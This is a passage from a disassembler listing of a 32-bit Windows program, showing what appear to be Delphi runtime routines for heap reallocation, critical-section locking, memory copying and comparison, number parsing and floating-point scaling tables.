		jz	short loc_402213
		and	edx, 7FFFFFFCh
		cmp	edx, 4
		jge	short loc_40220E
		mov	ds:dword_4175C0, 0Bh
		jmp	short loc_402245
; ---------------------------------------------------------------------------

loc_40220E:				; CODE XREF: sub_4020DC+124j
		or	dword ptr [eax], 1
		jmp	short loc_40223C
; ---------------------------------------------------------------------------

loc_402213:				; CODE XREF: sub_4020DC+119j
		mov	eax, edi
		cmp	dword ptr [eax+4], 0
		jz	short loc_402226
		cmp	dword ptr [eax], 0
		jz	short loc_402226
		cmp	dword ptr [eax+8], 0Ch
		jge	short loc_402232

loc_402226:				; CODE XREF: sub_4020DC+13Dj
					; sub_4020DC+142j
		mov	ds:dword_4175C0, 0Bh
		jmp	short loc_402245
; ---------------------------------------------------------------------------

loc_402232:				; CODE XREF: sub_4020DC+148j
		mov	edx, [eax+8]
		add	ebx, edx
		call	sub_401A04

loc_40223C:				; CODE XREF: sub_4020DC+135j
		mov	edx, ebx
		mov	eax, esi
		call	sub_401C6C

loc_402245:				; CODE XREF: sub_4020DC+6Fj
					; sub_4020DC+AEj ...
		mov	eax, ds:dword_4175C0
		mov	[ebp+var_4], eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_402275

loc_40225A:				; CODE XREF: sub_4020DC+197j
		cmp	ds:byte_417045,	0
		jz	short loc_40226D
		push	offset CriticalSection ; lpCriticalSection
		call	LeaveCriticalSection

loc_40226D:				; CODE XREF: sub_4020DC+185j
		retn
; ---------------------------------------------------------------------------

loc_40226E:				; DATA XREF: sub_4020DC+3Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40225A
; ---------------------------------------------------------------------------

loc_402275:				; CODE XREF: sub_4020DC+33j
					; sub_4020DC+10Fj ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_4020DC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402280	proc near		; CODE XREF: sub_40245C+4Cp

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF8h
		mov	esi, edx
		add	esi, 7
		and	esi, 0FFFFFFFCh
		cmp	esi, 0Ch
		jge	short loc_402299
		mov	esi, 0Ch

loc_402299:				; CODE XREF: sub_402280+12j
		mov	ebp, eax
		sub	ebp, 4
		mov	edi, [ebp+0]
		and	edi, 7FFFFFFCh
		mov	eax, ebp
		add	eax, edi
		mov	ebx, eax
		cmp	edi, esi
		jnz	short loc_4022B8
		mov	al, 1
		jmp	loc_402453
; ---------------------------------------------------------------------------

loc_4022B8:				; CODE XREF: sub_402280+2Fj
		cmp	edi, esi
		jle	loc_402343
		mov	edx, edi
		sub	edx, esi
		mov	[esp+18h+var_18], edx
		cmp	ebx, ds:dword_417618
		jnz	short loc_402307
		mov	eax, [esp+18h+var_18]
		sub	ds:dword_417618, eax
		mov	eax, [esp+18h+var_18]
		add	ds:dword_417614, eax
		cmp	ds:dword_417614, 0Ch
		jge	loc_40243A
		mov	eax, [esp+18h+var_18]
		add	ds:dword_417618, eax
		mov	eax, [esp+18h+var_18]
		sub	ds:dword_417614, eax
		mov	esi, edi
		jmp	loc_40243A
; ---------------------------------------------------------------------------

loc_402307:				; CODE XREF: sub_402280+4Dj
		mov	ebx, eax
		test	byte ptr [ebx],	2
		jnz	short loc_40231B
		mov	eax, ebx
		mov	edx, [eax+8]
		add	[esp+18h+var_18], edx
		call	sub_401A04

loc_40231B:				; CODE XREF: sub_402280+8Cj
		cmp	[esp+18h+var_18], 0Ch
		jl	short loc_40233C
		mov	ebx, ebp
		add	ebx, esi
		mov	eax, [esp+18h+var_18]
		or	eax, 2
		mov	[ebx], eax
		mov	eax, ebx
		add	eax, 4
		call	sub_401AC8
		jmp	loc_40243A
; ---------------------------------------------------------------------------

loc_40233C:				; CODE XREF: sub_402280+9Fj
		mov	esi, edi
		jmp	loc_40243A
; ---------------------------------------------------------------------------

loc_402343:				; CODE XREF: sub_402280+3Aj
					; sub_402280+1B1j
		mov	eax, esi
		sub	eax, edi
		mov	[esp+18h+var_14], eax
		cmp	ebx, ds:dword_417618
		jnz	short loc_4023BA
		mov	eax, ds:dword_417614
		cmp	eax, [esp+18h+var_14]
		jl	short loc_4023B1
		mov	eax, [esp+18h+var_14]
		sub	ds:dword_417614, eax
		mov	eax, [esp+18h+var_14]
		add	ds:dword_417618, eax
		cmp	ds:dword_417614, 0Ch
		jge	short loc_402393
		mov	eax, ds:dword_417614
		add	ds:dword_417618, eax
		add	esi, ds:dword_417614
		xor	eax, eax
		mov	ds:dword_417614, eax

loc_402393:				; CODE XREF: sub_402280+F9j
		mov	eax, esi
		sub	eax, edi
		add	ds:dword_4175B0, eax
		mov	eax, [ebp+0]
		and	eax, 80000003h
		or	esi, eax
		mov	[ebp+0], esi
		mov	al, 1
		jmp	loc_402453
; ---------------------------------------------------------------------------

loc_4023B1:				; CODE XREF: sub_402280+DCj
		call	sub_401CF4
		mov	ebx, ebp
		add	ebx, edi

loc_4023BA:				; CODE XREF: sub_402280+D1j
		test	byte ptr [ebx],	2
		jnz	short loc_40240C
		mov	edx, ebx
		mov	eax, edx
		mov	ecx, [eax+8]
		mov	[esp+18h+var_18], ecx
		mov	ecx, [esp+18h+var_18]
		cmp	ecx, [esp+18h+var_14]
		jge	short loc_4023E0
		add	edx, [esp+18h+var_18]
		mov	ebx, edx
		mov	eax, [esp+18h+var_18]
		sub	[esp+18h+var_14], eax
		jmp	short loc_40240C
; ---------------------------------------------------------------------------

loc_4023E0:				; CODE XREF: sub_402280+150j
		call	sub_401A04
		mov	eax, [esp+18h+var_14]
		sub	[esp+18h+var_18], eax
		cmp	[esp+18h+var_18], 0Ch
		jl	short loc_402400
		mov	eax, ebp
		add	eax, esi
		mov	edx, [esp+18h+var_18]
		call	sub_401C6C
		jmp	short loc_40243A
; ---------------------------------------------------------------------------

loc_402400:				; CODE XREF: sub_402280+170j
		add	esi, [esp+18h+var_18]
		mov	ebx, ebp
		add	ebx, esi
		and	dword ptr [ebx], 0FFFFFFFEh
		jmp	short loc_40243A
; ---------------------------------------------------------------------------

loc_40240C:				; CODE XREF: sub_402280+13Dj
					; sub_402280+15Ej
		mov	eax, [ebx]
		test	eax, 80000000h
		jz	short loc_402436
		and	eax, 7FFFFFFCh
		add	eax, ebx
		mov	ebx, eax
		mov	edx, [esp+18h+var_14]
		mov	eax, ebx
		call	sub_401DF8
		test	al, al
		jz	short loc_402436
		mov	ebx, ebp
		add	ebx, edi
		jmp	loc_402343
; ---------------------------------------------------------------------------

loc_402436:				; CODE XREF: sub_402280+193j
					; sub_402280+1ABj
		xor	eax, eax
		jmp	short loc_402453
; ---------------------------------------------------------------------------

loc_40243A:				; CODE XREF: sub_402280+68j
					; sub_402280+82j ...
		mov	eax, esi
		sub	eax, edi
		add	ds:dword_4175B0, eax
		mov	eax, [ebp+0]
		and	eax, 80000003h
		or	esi, eax
		mov	[ebp+0], esi
		mov	al, 1

loc_402453:				; CODE XREF: sub_402280+33j
					; sub_402280+12Cj ...
		pop	ecx
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_402280	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40245C	proc near		; CODE XREF: sub_402560+Dp
					; DATA XREF: DATA:off_416038o

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	esi, edx
		mov	ebx, eax
		cmp	ds:byte_4175BC,	0
		jnz	short loc_402483
		call	sub_401860
		test	al, al
		jnz	short loc_402483
		xor	eax, eax
		mov	[ebp+var_4], eax
		jmp	loc_402514
; ---------------------------------------------------------------------------

loc_402483:				; CODE XREF: sub_40245C+12j
					; sub_40245C+1Bj
		xor	edx, edx
		push	ebp
		push	offset loc_40250D
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		cmp	ds:byte_417045,	0
		jz	short loc_4024A4
		push	offset CriticalSection ; lpCriticalSection
		call	EnterCriticalSection

loc_4024A4:				; CODE XREF: sub_40245C+3Cj
		mov	edx, esi
		mov	eax, ebx
		call	sub_402280
		test	al, al
		jz	short loc_4024B6
		mov	[ebp+var_4], ebx
		jmp	short loc_4024EC
; ---------------------------------------------------------------------------

loc_4024B6:				; CODE XREF: sub_40245C+53j
		mov	eax, esi
		call	sub_401F4C
		mov	edi, eax
		mov	eax, ebx
		sub	eax, 4
		mov	eax, [eax]
		and	eax, 7FFFFFFCh
		sub	eax, 4
		cmp	esi, eax
		jge	short loc_4024D4
		mov	eax, esi

loc_4024D4:				; CODE XREF: sub_40245C+74j
		test	edi, edi
		jz	short loc_4024E9
		mov	edx, edi
		mov	ecx, ebx
		xchg	eax, ecx
		call	sub_402664
		mov	eax, ebx
		call	sub_4020DC

loc_4024E9:				; CODE XREF: sub_40245C+7Aj
		mov	[ebp+var_4], edi

loc_4024EC:				; CODE XREF: sub_40245C+58j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_402514

loc_4024F9:				; CODE XREF: sub_40245C+B6j
		cmp	ds:byte_417045,	0
		jz	short loc_40250C
		push	offset CriticalSection ; lpCriticalSection
		call	LeaveCriticalSection

loc_40250C:				; CODE XREF: sub_40245C+A4j
		retn
; ---------------------------------------------------------------------------

loc_40250D:				; DATA XREF: sub_40245C+2Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4024F9
; ---------------------------------------------------------------------------

loc_402514:				; CODE XREF: sub_40245C+22j
					; sub_40245C:loc_40250Cj
					; DATA XREF: ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40245C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402520	proc near		; CODE XREF: sub_402CD0+Ap
					; sub_403A58+Cp ...
		push	ebx
		test	eax, eax
		jle	short loc_40253A
		call	ds:off_416030
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_40253C
		mov	al, 1
		call	sub_402608
; ---------------------------------------------------------------------------
		jmp	short loc_40253C
; ---------------------------------------------------------------------------

loc_40253A:				; CODE XREF: sub_402520+3j
		xor	ebx, ebx

loc_40253C:				; CODE XREF: sub_402520+Fj
					; sub_402520+18j
		mov	eax, ebx
		pop	ebx
		retn
sub_402520	endp


; =============== S U B	R O U T	I N E =======================================


sub_402540	proc near		; CODE XREF: sub_402CEC+Cp
					; sub_403994+1Cp ...
		push	ebx
		test	eax, eax
		jz	short loc_40255A
		call	ds:off_416034
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_40255C
		mov	al, 2
		call	sub_402608
; ---------------------------------------------------------------------------
		jmp	short loc_40255C
; ---------------------------------------------------------------------------

loc_40255A:				; CODE XREF: sub_402540+3j
		xor	ebx, ebx

loc_40255C:				; CODE XREF: sub_402540+Fj
					; sub_402540+18j
		mov	eax, ebx
		pop	ebx
		retn
sub_402540	endp


; =============== S U B	R O U T	I N E =======================================


sub_402560	proc near		; CODE XREF: sub_403F0C+22p
					; sub_40458C+BBp
		mov	ecx, [eax]
		test	ecx, ecx
		jz	short loc_402598
		test	edx, edx
		jz	short loc_402582
		push	eax
		mov	eax, ecx
		call	ds:off_416038
		pop	ecx
		or	eax, eax
		jz	short loc_402591
		mov	[ecx], eax
		retn
; ---------------------------------------------------------------------------

loc_40257B:				; CODE XREF: sub_402560+2Ej
		mov	al, 2
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_402582:				; CODE XREF: sub_402560+8j
		mov	[eax], edx
		mov	eax, ecx
		call	ds:off_416034
		or	eax, eax
		jnz	short loc_40257B
		retn
; ---------------------------------------------------------------------------

loc_402591:				; CODE XREF: sub_402560+16j
					; sub_402560+48j
		mov	al, 1
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_402598:				; CODE XREF: sub_402560+4j
		test	edx, edx
		jz	short locret_4025AC
		push	eax
		mov	eax, edx
		call	ds:off_416030
		pop	ecx
		or	eax, eax
		jz	short loc_402591
		mov	[ecx], eax

locret_4025AC:				; CODE XREF: sub_402560+3Aj
		retn
sub_402560	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_4025B0	proc near		; CODE XREF: sub_4025BC+42p
					; CODE:004034C7p
		mov	ds:dword_416004, edx
		call	sub_40397C
sub_4025B0	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_4025BC	proc near		; CODE XREF: sub_402608+6j
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		and	bl, 7Fh
		cmp	ds:dword_417008, 0
		jz	short loc_4025D8
		mov	edx, esi
		mov	eax, ebx
		call	ds:dword_417008

loc_4025D8:				; CODE XREF: sub_4025BC+10j
		test	bl, bl
		jnz	short loc_4025E9
		call	sub_405048
		mov	ebx, [eax+4]
		jmp	short loc_4025F8
; ---------------------------------------------------------------------------

loc_4025E9:				; CODE XREF: sub_4025BC+1Ej
		cmp	bl, 18h
		ja	short loc_4025F8
		xor	eax, eax
		mov	al, bl
		mov	bl, ds:byte_41603C[eax]

loc_4025F8:				; CODE XREF: sub_4025BC+2Bj
					; sub_4025BC+30j
		xor	eax, eax
		mov	al, bl
		mov	edx, esi
		call	sub_4025B0
sub_4025BC	endp

; ---------------------------------------------------------------------------
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_402608	proc near		; CODE XREF: sub_402520+13p
					; sub_402540+13p ...
		and	eax, 7Fh
		mov	edx, [esp+0]
		jmp	sub_4025BC
sub_402608	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_402614	proc near		; CODE XREF: sub_413CE8+28p
		push	eax
		push	edx
		push	ecx
		call	sub_405048
		cmp	dword ptr [eax+4], 0
		pop	ecx
		pop	edx
		pop	eax
		jnz	short loc_402629
		retn
; ---------------------------------------------------------------------------

loc_402629:				; CODE XREF: sub_402614+12j
		xor	eax, eax
		jmp	sub_402608
sub_402614	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402634	proc near		; CODE XREF: sub_4026A4+3Cp
					; sub_4026F8+38p ...
		push	ebx
		mov	ebx, eax
		call	sub_405048
		mov	[eax+4], ebx
		pop	ebx
		retn
sub_402634	endp


; =============== S U B	R O U T	I N E =======================================


sub_402644	proc near		; CODE XREF: sub_413F68+7p
		push	ebx
		call	sub_405048
		mov	ebx, [eax+4]
		call	sub_405048
		xor	edx, edx
		mov	[eax+4], edx
		mov	eax, ebx
		pop	ebx
		retn
sub_402644	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_402664	proc near		; CODE XREF: sub_40245C+81p
					; sub_4039E8+1Bp ...
		push	esi
		push	edi
		mov	esi, eax
		mov	edi, edx
		mov	eax, ecx
		cmp	edi, esi
		ja	short loc_402683
		jz	short loc_4026A1
		sar	ecx, 2
		js	short loc_4026A1
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		rep movsb
		pop	edi
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_402683:				; CODE XREF: sub_402664+Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		sar	ecx, 2
		js	short loc_4026A1
		std
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		add	esi, 3
		add	edi, 3
		rep movsb
		cld

loc_4026A1:				; CODE XREF: sub_402664+Cj
					; sub_402664+11j ...
		pop	edi
		pop	esi
		retn
sub_402664	endp


; =============== S U B	R O U T	I N E =======================================


sub_4026A4	proc near		; CODE XREF: sub_4026EC+3p
		push	ebx
		mov	cx, [eax+4]
		sub	cx, 0D7B1h
		jz	short loc_4026BF
		dec	ecx
		sub	cx, 2
		jnb	short loc_4026C3
		mov	ebx, edx
		call	ebx
		mov	ebx, eax
		jmp	short loc_4026DA
; ---------------------------------------------------------------------------

loc_4026BF:				; CODE XREF: sub_4026A4+Aj
		xor	ebx, ebx
		jmp	short loc_4026DA
; ---------------------------------------------------------------------------

loc_4026C3:				; CODE XREF: sub_4026A4+11j
		cmp	eax, offset dword_417214
		jz	short loc_4026D1
		cmp	eax, offset dword_4173E0
		jnz	short loc_4026D5

loc_4026D1:				; CODE XREF: sub_4026A4+24j
		xor	ebx, ebx
		jmp	short loc_4026DA
; ---------------------------------------------------------------------------

loc_4026D5:				; CODE XREF: sub_4026A4+2Bj
		mov	ebx, 67h

loc_4026DA:				; CODE XREF: sub_4026A4+19j
					; sub_4026A4+1Dj ...
		test	ebx, ebx
		jz	short loc_4026E5
		mov	eax, ebx
		call	sub_402634

loc_4026E5:				; CODE XREF: sub_4026A4+38j
		mov	eax, ebx
		pop	ebx
		retn
sub_4026A4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4026EC	proc near		; CODE XREF: sub_413CE8+23p
		mov	edx, [eax+1Ch]
		call	sub_4026A4
		retn
sub_4026EC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4026F8	proc near		; CODE XREF: sub_404E20+1Ep
					; sub_404E20+28p ...
		push	ebx
		push	esi
		mov	ebx, eax
		xor	esi, esi
		mov	ax, [ebx+4]
		cmp	ax, 0D7B1h
		jb	short loc_402737
		cmp	ax, 0D7B3h
		ja	short loc_402737
		and	ax, 0D7B2h
		cmp	ax, 0D7B2h
		jnz	short loc_40271F
		mov	eax, ebx
		call	dword ptr [ebx+1Ch]
		mov	esi, eax

loc_40271F:				; CODE XREF: sub_4026F8+1Ej
		test	esi, esi
		jnz	short loc_40272A
		mov	eax, ebx
		call	dword ptr [ebx+24h]
		mov	esi, eax

loc_40272A:				; CODE XREF: sub_4026F8+29j
		test	esi, esi
		jz	short loc_402749
		mov	eax, esi
		call	sub_402634
		jmp	short loc_402749
; ---------------------------------------------------------------------------

loc_402737:				; CODE XREF: sub_4026F8+Ej
					; sub_4026F8+14j
		cmp	ebx, offset dword_417048
		jz	short loc_402749
		mov	eax, 67h
		call	sub_402634

loc_402749:				; CODE XREF: sub_4026F8+34j
					; sub_4026F8+3Dj ...
		mov	eax, esi
		pop	esi
		pop	ebx
		retn
sub_4026F8	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402750	proc near		; CODE XREF: CODE:00403162p
		push	ebx
		push	esi
		push	ecx
		mov	esi, ecx
		shr	esi, 2
		jz	short loc_402780

loc_40275A:				; CODE XREF: sub_402750+26j
		mov	ecx, [eax]
		mov	ebx, [edx]
		cmp	ecx, ebx
		jnz	short loc_4027A7
		dec	esi
		jz	short loc_40277A
		mov	ecx, [eax+4]
		mov	ebx, [edx+4]
		cmp	ecx, ebx
		jnz	short loc_4027A7
		add	eax, 8
		add	edx, 8
		dec	esi
		jnz	short loc_40275A
		jmp	short loc_402780
; ---------------------------------------------------------------------------

loc_40277A:				; CODE XREF: sub_402750+13j
		add	eax, 4
		add	edx, 4

loc_402780:				; CODE XREF: sub_402750+8j
					; sub_402750+28j
		pop	esi
		and	esi, 3
		jz	short loc_4027BC
		mov	cl, [eax]
		cmp	cl, [edx]
		jnz	short loc_4027BC
		dec	esi
		jz	short loc_4027A2
		mov	cl, [eax+1]
		cmp	cl, [edx+1]
		jnz	short loc_4027BC
		dec	esi
		jz	short loc_4027A2
		mov	cl, [eax+2]
		cmp	cl, [edx+2]
		jnz	short loc_4027BC

loc_4027A2:				; CODE XREF: sub_402750+3Dj
					; sub_402750+48j
		xor	eax, eax
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_4027A7:				; CODE XREF: sub_402750+10j
					; sub_402750+1Dj
		pop	esi
		cmp	cl, bl
		jnz	short loc_4027BC
		cmp	ch, bh
		jnz	short loc_4027BC
		shr	ecx, 10h
		shr	ebx, 10h
		cmp	cl, bl
		jnz	short loc_4027BC
		cmp	ch, bh

loc_4027BC:				; CODE XREF: sub_402750+34j
					; sub_402750+3Aj ...
		pop	esi
		pop	ebx
		retn
sub_402750	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4027C0	proc near		; CODE XREF: sub_40458C+F1p
					; sub_40458C+145p ...
		push	edi
		mov	edi, eax
		mov	ch, cl
		mov	eax, ecx
		shl	eax, 10h
		mov	ax, cx
		mov	ecx, edx
		sar	ecx, 2
		js	short loc_4027DD
		rep stosd
		mov	ecx, edx
		and	ecx, 3
		rep stosb

loc_4027DD:				; CODE XREF: sub_4027C0+12j
		pop	edi
		retn
sub_4027C0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4027E0	proc near		; CODE XREF: sub_404DAC+41p
					; sub_412998+6p
		push	ebx
		push	esi
		push	edi
		mov	esi, eax
		push	eax
		test	eax, eax
		jz	short loc_402856
		xor	eax, eax
		xor	ebx, ebx
		mov	edi, 0CCCCCCCh

loc_4027F3:				; CODE XREF: sub_4027E0+19j
		mov	bl, [esi]
		inc	esi
		cmp	bl, 20h
		jz	short loc_4027F3
		mov	ch, 0
		cmp	bl, 2Dh
		jz	short loc_402864
		cmp	bl, 2Bh
		jz	short loc_402866

loc_402807:				; CODE XREF: sub_4027E0+89j
		cmp	bl, 24h
		jz	short loc_40286B
		cmp	bl, 78h
		jz	short loc_40286B
		cmp	bl, 58h
		jz	short loc_40286B
		cmp	bl, 30h
		jnz	short loc_40282E
		mov	bl, [esi]
		inc	esi
		cmp	bl, 78h
		jz	short loc_40286B
		cmp	bl, 58h
		jz	short loc_40286B
		test	bl, bl
		jz	short loc_40284C
		jmp	short loc_402832
; ---------------------------------------------------------------------------

loc_40282E:				; CODE XREF: sub_4027E0+39j
		test	bl, bl
		jz	short loc_40285F

loc_402832:				; CODE XREF: sub_4027E0+4Cj
					; sub_4027E0+6Aj
		sub	bl, 30h
		cmp	bl, 9
		ja	short loc_40285F
		cmp	eax, edi
		ja	short loc_40285F
		lea	eax, [eax+eax*4]
		add	eax, eax
		add	eax, ebx
		mov	bl, [esi]
		inc	esi
		test	bl, bl
		jnz	short loc_402832

loc_40284C:				; CODE XREF: sub_4027E0+4Aj
		dec	ch
		jz	short loc_402859
		test	eax, eax
		jge	short loc_4028A8
		jmp	short loc_40285F
; ---------------------------------------------------------------------------

loc_402856:				; CODE XREF: sub_4027E0+8j
					; sub_4027E0+95j
		inc	esi
		jmp	short loc_40285F
; ---------------------------------------------------------------------------

loc_402859:				; CODE XREF: sub_4027E0+6Ej
		neg	eax
		jle	short loc_4028A8
		js	short loc_4028A8

loc_40285F:				; CODE XREF: sub_4027E0+50j
					; sub_4027E0+58j ...
		pop	ebx
		sub	esi, ebx
		jmp	short loc_4028AB
; ---------------------------------------------------------------------------

loc_402864:				; CODE XREF: sub_4027E0+20j
		inc	ch

loc_402866:				; CODE XREF: sub_4027E0+25j
		mov	bl, [esi]
		inc	esi
		jmp	short loc_402807
; ---------------------------------------------------------------------------

loc_40286B:				; CODE XREF: sub_4027E0+2Aj
					; sub_4027E0+2Fj ...
		mov	edi, 0FFFFFFFh
		mov	bl, [esi]
		inc	esi
		test	bl, bl
		jz	short loc_402856

loc_402877:				; CODE XREF: sub_4027E0+C0j
		cmp	bl, 61h
		jb	short loc_40287F
		sub	bl, 20h

loc_40287F:				; CODE XREF: sub_4027E0+9Aj
		sub	bl, 30h
		cmp	bl, 9
		jbe	short loc_402892
		sub	bl, 11h
		cmp	bl, 5
		ja	short loc_40285F
		add	bl, 0Ah

loc_402892:				; CODE XREF: sub_4027E0+A5j
		cmp	eax, edi
		ja	short loc_40285F
		shl	eax, 4
		add	eax, ebx
		mov	bl, [esi]
		inc	esi
		test	bl, bl
		jnz	short loc_402877
		dec	ch
		jnz	short loc_4028A8
		neg	eax

loc_4028A8:				; CODE XREF: sub_4027E0+72j
					; sub_4027E0+7Bj ...
		pop	ecx
		xor	esi, esi

loc_4028AB:				; CODE XREF: sub_4027E0+82j
		mov	[edx], esi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4027E0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4028B4	proc near		; CODE XREF: sub_414844+A5p
		push	esi
		push	edi
		mov	esi, eax
		mov	edi, edx
		and	ecx, 0FFh
		repe cmpsb
		pop	edi
		pop	esi
		retn
sub_4028B4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_4028C8	proc near		; CODE XREF: sub_4133F5+58p
		jmp	sub_4028D0
sub_4028C8	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4028D0	proc near		; CODE XREF: sub_4028C8j
		push	ebx
		xor	ebx, ebx
		test	eax, eax
		jl	short loc_402924
		jz	loc_402977
		cmp	eax, 1400h
		jge	loc_402969
		mov	edx, eax
		and	edx, 1Fh
		lea	edx, [edx+edx*4]
		fld	tbyte_402983[ebx+edx*2]
		fmulp	st(1), st
		shr	eax, 5
		jz	short loc_402977
		mov	edx, eax
		and	edx, 0Fh
		jz	short loc_402911
		lea	edx, [edx+edx*4]
		fld	tbyte_402AB9[ebx+edx*2]
		fmulp	st(1), st

loc_402911:				; CODE XREF: sub_4028D0+33j
		shr	eax, 4
		jz	short loc_402977
		lea	eax, [eax+eax*4]
		fld	tbyte_402B4F[ebx+eax*2]
		fmulp	st(1), st
		jmp	short loc_402977
; ---------------------------------------------------------------------------

loc_402924:				; CODE XREF: sub_4028D0+5j
		neg	eax
		cmp	eax, 1400h
		jge	short loc_402973
		mov	edx, eax
		and	edx, 1Fh
		lea	edx, [edx+edx*4]
		fld	tbyte_402983[ebx+edx*2]
		fdivp	st(1), st
		shr	eax, 5
		jz	short loc_402977
		mov	edx, eax
		and	edx, 0Fh
		jz	short loc_402956
		lea	edx, [edx+edx*4]
		fld	tbyte_402AB9[ebx+edx*2]
		fdivp	st(1), st

loc_402956:				; CODE XREF: sub_4028D0+78j
		shr	eax, 4
		jz	short loc_402977
		lea	eax, [eax+eax*4]
		fld	tbyte_402B4F[ebx+eax*2]
		fdivp	st(1), st
		jmp	short loc_402977
; ---------------------------------------------------------------------------

loc_402969:				; CODE XREF: sub_4028D0+12j
		fstp	st
		fld	tbyte_402979[ebx]
		jmp	short loc_402977
; ---------------------------------------------------------------------------

loc_402973:				; CODE XREF: sub_4028D0+5Bj
		fstp	st
		fldz

loc_402977:				; CODE XREF: sub_4028D0+7j
					; sub_4028D0+2Cj ...
		pop	ebx
		retn
sub_4028D0	endp

; ---------------------------------------------------------------------------
tbyte_402979	dt 1.1897314953572317651e4932 ;	DATA XREF: sub_4028D0+9Br
tbyte_402983	dt 1.0			; DATA XREF: sub_4028D0+20r
					; sub_4028D0+65r
		align 10h
		dd 0
		dd 4002A0h, 0
		dd 5C80000h, 40h, 0
		dd 4008FAh, 0
		dd 0C9C4000h, 40h, 50000000h, 400FC3h, 0
		dd 12F42400h, 40h, 96800000h, 401698h, 0
		dd 19BEBC20h, 40h, 6B280000h, 401CEEh, 0
		dd 209502F9h, 40h, 43B74000h, 4023BAh, 10000000h, 26E8D4A5h
		dd 40h,	84E72A00h, 402A91h, 0F4800000h,	2DB5E620h, 40h
		dd 5FA931A0h, 4030E3h, 0BF040000h, 348E1BC9h, 40h, 0A2BC2EC5h
		dd 4037B1h, 3A764000h, 3ADE0B6Bh, 0E8000040h, 0C7230489h
		dd 403E8Ah, 0C5AC6200h,	41AD78EBh, 7A800040h, 0D726B717h
		dd 4044D8h, 326EAC90h, 48878678h, 57B40040h, 68163F0Ah
		dd 404BA9h, 0CECCEDA1h,	4ED3C21Bh, 1484A040h, 59516140h
		dd 0C8405284h, 0B99019A5h, 55A56FA5h, 200F3A40h, 0CB8F27F4h
		dd 844058CEh, 78F89409h, 5C813F39h, 0B90BE540h,	8F07D736h
		dd 0DF405FA1h, 0CD04674Eh, 62C9F2C9h
		db 40h
tbyte_402AB9	dt 9.9999999999999999998e30 ; DATA XREF: sub_4028D0+38r
					; sub_4028D0+7Dr
		db 9Eh
		dd 0A82B70B5h, 699DC5ADh, 0CFA6D540h, 781F49FFh, 0A340D3C2h
		dd 16C59B14h, 3DEFB3ABh, 0E98CE041h, 0BA47C980h, 0AA41A893h
		dd 2B7FE617h, 12B616A1h, 27556B42h, 70F78D39h, 30427CE0h
		dd 0FFE33CC9h, 0E78A5296h, 0F9DE8E42h, 7EEBFB9Dh, 8C4351AAh
		dd 195C6A2Fh, 0BBD226FCh, 0CCE37643h, 842F29F2h, 0D2442681h
		dd 0DB900Ah, 909FA427h,	0F8AA1744h, 0C5E310AEh,	5944FAC4h
		dd 7E9B09Ch, 64F28A9Ch,	0F7F3D445h, 7A4AE1EBh
		db 95h,	0CFh, 45h
tbyte_402B4F	dt 9.9999999999999999996e479 ; DATA XREF: sub_4028D0+49r
					; sub_4028D0+8Er
		db 0C7h, 91h, 0Eh
		dd 19A0AEA6h, 1746A3E3h, 8681750Ch, 48C97675h, 93A7E44Dh
		dd 0B8353B39h, 0E553EDB2h, 5DC53D5Dh, 929E8B3Bh, 0A1F0A65Ah
		dd 0A554C020h, 8B61378Ch, 25D88B5Ah, 0DBF9895Dh, 27F3F867h
